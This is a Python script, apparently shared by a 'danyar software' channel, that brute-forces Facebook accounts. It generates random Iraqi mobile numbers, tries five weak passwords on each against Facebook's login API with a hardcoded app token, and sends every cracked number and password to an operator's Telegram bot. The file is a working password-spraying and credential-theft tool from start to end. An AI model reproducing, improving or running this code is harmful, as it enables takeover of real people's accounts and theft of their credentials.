


#sourc code free bo chanale hama software 
#drust krawa lakayn danyar software
#ba heway sud


from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

head = {
'user-agent':'Mozilla/5.0 (Linux; U; Android 10; en-gb;  Note 9 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.9.3-gn'
}







import requests
import os
import sys
import time
import random
ani = sys.platform
id=input("id xow :")
bot=input("token bot : ")
def number():
	cp=open("cp.txt","w")
	os.system("clear")
	print("0770 , 0750 , 0772 , 0751 , 0771 , 0782 ")
	inn=input("choice number  : ")
	filer = open("phone.txt","w")
	for x in range(2000):
		x="12345678900987654321"
		x1=random.choice(x)
		x2=random.choice(x)
		x3=random.choice(x)
		x4=random.choice(x)
		x5=random.choice(x)
		x6=random.choice(x)
		x7=random.choice(x)
		x8=x1+x2+x3+x4+x5+x6+x7
		x9=inn+x8
		print(x9)
		filer.write(x9+"\n")
logo='''
                 
                 snap = @vx.dana0

                 insta = @danyad.software

                 telegram = @danyarsoftware

                  ---------------------------
                  '''


ph = open("phone.txt","r").readlines()
def one():
      os.system("clear")
      global filer
      global logo
      a1 = 0
      a2 = 0
      a3 = 0
      global ph
      cp = open("cp.txt","w")
      print(logo)
      print('FACEBOOK CRACKED ... ')
      print("")
      print("PLEAS WAIT..")
      print("____________")
      print("OK :{}".format(a1))
      print("CP :{}".format(a2))
      print("SEND TELGRAM :{}".format(a3))
      for x in ph:
            u = x.strip()
            pas1=u[4]+u[5]+u[6]+u[7]+u[8]+u[9]+u[10]
            pas2=u
            pas3='1122334455'
            pas4='1234554321'
            pas5='123454321'
            
            url="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + u + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
            re = requests.get(url,headers=head).text
           # print(re)
            if '"secure":true,"httponly":true}]' in re:
                  os.system("clear")
                  print(logo)
                  a1+=1
                  a3+=1
                  print('FACEBOOK CRACKED ... ')
                  print("")
                  print("PLEAS WAIT..")
                  print("____________")
                  print("OK :{}".format(a1))
                  print("CP :{}".format(a2))
                  print("SEND TELGRAM :{}".format(a3))
                  bot_message = "°danyar.software°\nEMAIL : "+u+"\nPASSWORD : "+pas1
                  bot_token =bot
                  bot_chatID = id
                  send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
                  response = requests.get(send_text)

            if 'www.facebook.com' in re:
                  os.system("clear")
                  print(logo)
                  a2+=1
                  print('FACEBOOK CRACKED ... ')
                  print("")
                  print("PLEAS WAIT..")
                  print("____________")
                  print("OK :{}".format(a1))
                  print("CP :{}".format(a2))
                  print("SEND TELGRAM :{}".format(a3))
                  cp.write(u+"\n")
            else:
                  time.sleep(2)
                  url2="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + u + "&locale=en_US&password="+ pas2 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                  re2 = requests.get(url2,headers=head).text
                  
                  if '"secure":true,"httponly":true}]' in re2:
                        os.system("clear")
                        print(logo)
                        a1+=1
                        a3+=1
                        print('FACEBOOK CRACKED ... ')
                        print("")
                        print("PLEAS WAIT..")
                        print("____________")
                        print("OK :{}".format(a1))
                        print("CP :{}".format(a2))
                        print("SEND TELGRAM :{}".format(a3))
                        
                        bot_message = "°danyar.software°\nEMAIL : "+u+"\nPASSWORD : "+pas2
                        bot_token =bot
                        bot_chatID = id
                        send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
                        response = requests.get(send_text)
                  if 'www.facebook.com' in re2:
                        os.system("clear")
                        print(logo)
                        a2+=1
                        print('FACEBOOK CRACKED ... ')
                        print("")
                        print("PLEAS WAIT..")
                        print("____________")
                        print("OK :{}".format(a1))
                        print("CP :{}".format(a2))
                        print("SEND TELGRAM :{}".format(a3))
                        cp.write(u+"\n")
                      










                  else:
                        url3="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + u + "&locale=en_US&password="+ pas3 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                        re3 = requests.get(url3,headers=head).text
                       
                        if '"secure":true,"httponly":true}]' in re3:
                              os.system("clear")
                              print(logo)
                              a1+=1
                              a3+=1
                              print('FACEBOOK CRACKED ... ')
                              print("")
                              print("PLEAS WAIT..")
                              print("____________")
                              print("OK :{}".format(a1))
                              print("CP :{}".format(a2))
                              print("SEND TELGRAM :{}".format(a3))
                              bot_message = "°danyar.software°\nEMAIL : "+u+"\nPASSWORD : "+pas3
                              bot_token =bot
                              bot_chatID = id
                              send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
                              response = requests.get(send_text)
                        if 'www.facebook.com' in re3:
                              os.system("clear")
                              print(logo)
                              a2+=1
                              print('FACEBOOK CRACKED ... ')
                              print("")
                              print("PLEAS WAIT..")
                              print("____________")
                              print("OK :{}".format(a1))
                              print("CP :{}".format(a2))
                              print("SEND TELGRAM :{}".format(a3))
                              cp.write(u+"\n")
                             
                              
                        else:
                              url4="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + u + "&locale=en_US&password="+ pas4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                              re4 =requests.get(url4,headers=head).text
                             
                              if '"secure":true,"httponly":true}]' in re4:
                                  os.system("clear")
                                  print(logo)
                                  a1+=1
                                  a3+=1
                                  print('FACEBOOK CRACKED ... ')
                                  print("")
                                  print("PLEAS WAIT..")
                                  print("____________")
                                  print("OK :{}".format(a1))
                                  print("CP :{}".format(a2))
                                  print("SEND TELGRAM :{}".format(a3))
                                  bot_message = "°danyar.software°\nEMAIL : "+u+"\nPASSWORD : "+pas4
                                  bot_token =bot
                                  bot_chatID = id
                                  send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
                                  response = requests.get(send_text)
                              if 'www.facebook.com' in re4:
                                  os.system("clear")
                                  print(logo)
                                  a2+=1
                                  print('FACEBOOK CRACKED ... ')
                                  print("")
                                  print("PLEAS WAIT..")
                                  print("____________")
                                  print("OK :{}".format(a1))
                                  print("CP :{}".format(a2))
                                  print("SEND TELGRAM :{}".format(a3))
                                  cp.write(u+"\n")
                              else:
                                    
                                    url5="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + u + "&locale=en_US&password="+ pas5 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                                    re5 = requests.get(url5,headers=head).text
                                    
                                   # print(re5)
                                    if '"secure":true,"httponly":true}]' in re5:
                                          os.system("clear")
                                          print(logo)
                                          a1+=1
                                          a3+=1
                                          print('FACEBOOK CRACKED ... ')
                                          print("")
                                          print("PLEAS WAIT..")
                                          print("____________")
                                          print("OK :{}".format(a1))
                                          print("CP :{}".format(a2))
                                          print("SEND TELGRAM :{}".format(a3))
                                          bot_message = "°danyar.software°\nEMAIL : "+u+"\nPASSWORD : "+pas5
                                          bot_token =bot
                                          bot_chatID = id
                                          send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
                                          response = requests.get(send_text)
                                          
                                    if 'www.facebook.com' in re5:
                                          os.system("clear")
                                          print(logo)
                                          a2+=1
                                          print('FACEBOOK CRACKED ... ')
                                          print("")
                                          print("PLEAS WAIT..")
                                          print("____________")
                                          print("OK :{}".format(a1))
                                          print("CP :{}".format(a2))
                                          print("SEND TELGRAM :{}".format(a3))
                                          cp.write(u+"\n")


number()       
one()